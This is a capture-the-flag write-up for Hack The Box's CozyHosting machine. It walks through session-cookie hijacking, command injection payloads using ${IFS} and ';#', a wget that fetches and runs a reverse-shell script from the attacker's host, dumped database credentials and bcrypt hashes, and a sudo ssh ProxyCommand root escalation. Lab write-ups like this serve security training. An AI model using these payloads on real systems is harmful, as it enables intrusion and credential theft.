# Analytics - Writeup

**Date**: 13/10/2023

**Difficulty**: EASY

**CTF**: [https://app.hackthebox.com/machines/CozyHosting](https://app.hackthebox.com/machines/CozyHosting)


---

# Enumeration


`nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.230 -vvv -oG allPorts`

![Untitled](img/Pasted%20image%2020231002193732.png)

`nmap -sCV -p22,80 10.10.11.230 -oN targeted`

![Untitled](img/Pasted%20image%2020231002193850.png)



`nmap --script=http-enum -p80 10.10.11.230 -oN webContent`

![Untitled](img/Pasted%20image%2020231002194447.png)


`whatweb http://10.10.11.230`

![Untitled](img/Pasted%20image%2020231002194512.png)

It tries to redirect us to http://cozyhosting.htb. Let's add this domain in the **/etc/hosts** file:

![Untitled](img/Pasted%20image%2020231002194841.png)

`whatweb http://cozyhosting.htb`

![Untitled](img/Pasted%20image%2020231002194908.png)

We can see an email address (info@cozyhosting.htb).


Let's check the website:

![Untitled](img/Pasted%20image%2020231002195046.png)

![Untitled](img/Pasted%20image%2020231002195141.png)

![Untitled](img/Pasted%20image%2020231002195226.png)

Looks like it's not vulnerable to SQLi (at least to common SQLi queries)



Let's search directories:

`gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://cozyhosting.htb -t 20`

![Untitled](img/Pasted%20image%2020231002195945.png)



Nothing I can use. Let's look for subdomains:

`gobuster vhost -u http://cozyhosting.htb/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt --append-domain -t 20`

![Untitled](img/Pasted%20image%2020231002200717.png)



Nooothing, as the server is using nginx, let's try with the nginx wordlist:

![Untitled](img/Pasted%20image%2020231002201747.png)

Nothing!



When I do hovering over the icon in the mainpage, the url is http://cozyhosting.htb/index.html

![Untitled](img/Pasted%20image%2020231002201726.png)

When I click on that icon this page appears:

![Untitled](img/Pasted%20image%2020231002202153.png)

Searching in Google for "Whitelabel Error Page exploit" I found [this interesting link](https://exploit-notes.hdks.org/exploit/web/framework/java/spring-pentesting/). 


It seems that if we see this error, the server may be using Spring Boot:

![Untitled](img/Pasted%20image%2020231002202351.png)

There is a wordlist called "spring-boot.txt" on SecLists that we can use to check it:

`gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/spring-boot.txt -u http://cozyhosting.htb -t 20`

![Untitled](img/Pasted%20image%2020231002202442.png)

Looks like Spring is being used. It may be vulnerable to SSTI, but we have not found any pint for exploiting this vulnerability yet.

![Untitled](img/Pasted%20image%2020231002223056.png)

At http://cozyhosting.htb/actuator/sessions we can see that there are some tokens. One of them appears to be related to the user **kanderson**.

Let's intercept the login request on http://cozyhosting.htb/login with BurpSuite

![Untitled](img/Pasted%20image%2020231002203517.png)

Here we can see that the website is using a Cookie named **JSESSIONID**. Let's try to change the value with the one of the kanderson session:

![Untitled](img/Pasted%20image%2020231002223142.png)

Once done, let's try to access to http://cozyhosting.htb/admin

![Untitled](img/Pasted%20image%2020231002223202.png)

Yeah, access granted. Let's take a look at what we can do. All the links are broken, but we have a form we can send. 

Let's intercept the request using BurpSuite:

![Untitled](img/Pasted%20image%2020231013164811.png)

apparently we are receiving the output of an ssh command that doesn't recognize "test" as a hostname.

If we don't provide an username this error appears:

![Untitled](img/Pasted%20image%2020231013165040.png)

It appears to be executing something like `ssh <hosname>:<username>` and not giving the username input leads into that error.

Maybe we can concatenate code to make the target execute it? Let's try it writing in the input `;ping -c1 10.10.14.7 ` and listening for icmp in our machine to see if the code gets executed: `tcpdump -i tun0 icmp -n`

![Untitled](img/Pasted%20image%2020231013170314.png)

Apparently the input cannot contain whitespaces, and URL encoding them don't help. We can try replacing the spaces with `${IFS}` that will be interpreted by the bash as a space. So, the username input will look like this: `;ping${IFS}-c1${IFS}10.10.14.7`

![Untitled](img/Pasted%20image%2020231013171105.png)

Now the input seems right, but we keep getting an error. Maybe the command is not `ssh <hosname>:<username>` and it's something like `ssh <hosname>:<username> flags and more code`. If this is the case, maybe we can comment everything at the right of out input by adding `;#` to the input. So the username input would be: `;ping${IFS}-c1${IFS}10.10.14.7;#`



![Untitled](img/Pasted%20image%2020231013171037.png)Yeah! Our machine received a ping from the target machine, so we can execute commands in the target machine. Let's try to obtain a reverse shell:

`;wget${IFS}http://10.10.14.7/revshell.sh${IFS}-P${IFS}/tmp;#`

![Untitled](img/Pasted%20image%2020231013173415.png)

Now, let's change the permissions of the file to make it executable:

![Untitled](img/Pasted%20image%2020231013173555.png)



And now, let's try to execute the script! `;/tmp/revshell.sh;#`

![Untitled](img/Pasted%20image%2020231013173623.png)

And we obtained a reverse shell!

Let's do the tty treatment:

```
script -c bash /dev/null
CTRL + Z
stty raw -echo;fg
reset xterm
export TERM=xterm
export SHELL=bash
stty columns 206 rows 52
```



Once done, let's see with which user are we logged as:

![Untitled](img/Pasted%20image%2020231013174212.png)

Let's take a look to the /etc/pass to see with users are registered with a bash:

![Untitled](img/Pasted%20image%2020231013174255.png)

So,  **josh** and **root**.

![Untitled](img/Pasted%20image%2020231013174827.png)

There is a jar file on the current directory, so let's transfer it to our machine to extract the data just in case there is anything useful.

![Untitled](img/Pasted%20image%2020231013175052.png)

I don't know if it will be useful, but we got credentials to access a database: `postgres:Vg&nvzAQ7XxR`

![Untitled](img/Pasted%20image%2020231013175843.png)

The credentials were valid and now we can take a look to the database info!



With the command `\dt` **psql** shows us the tables of the current database:

![Untitled](img/Pasted%20image%2020231013180058.png)

With the command `\d <table_name>` we can see the columns of a table. In this case, the table **hosts**:

![Untitled](img/Pasted%20image%2020231013180342.png)

With the query `SELECT id, username, hostname FROM host;` we can dump all the info contained in these columns:

![Untitled](img/Pasted%20image%2020231013180721.png)



Let's do the same for the table **users**:

![Untitled](img/Pasted%20image%2020231013180848.png)

![Untitled](img/Pasted%20image%2020231013180918.png)

`kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim`

`admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm`

The passwords are encrypted, apparently in bcrypt. Let's try to crack them using **john**:

![Untitled](img/Pasted%20image%2020231013181720.png)

After a while, **john** reports a coincidence for the admin password `manchesterunited` let's check if that password allows us to do user pivoting:

![Untitled](img/Pasted%20image%2020231013181908.png)

It didn't work for root user, but it did for **josh**.

![Untitled](img/Pasted%20image%2020231013182038.png)

We found the user flag inside the user folder of josh. Now it's time to do privilege escalation



# Privilege Escalation

First of all let's check if **josh** belongs to any privileged group or have any sudo permissions:

![Untitled](img/Pasted%20image%2020231013182202.png)

**josh** can run ssh as **root**! According to gtfobins.io, executing ssh with sudo rights can give us an interactive root shell!



![Untitled](img/Pasted%20image%2020231013182507.png)

`sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x`

![Untitled](img/Pasted%20image%2020231013182736.png)

And just like that we obtained a root shell, went to /root folder and found the root flag!



# New things learned

- `${IFS}` is interpreted by **bash** as a white space. Useful for inputs.

- In cases where we think we can inject a command it'll be necessary to add `;` before the command we want to inject (in order to make sure that it'll be executed after the rest of the command before) and append `;#` after the command we want to inject (in order to comment the rest of the command on the right if any)

- **.jar** files are compressed files that can be decompressed with **unzip**.
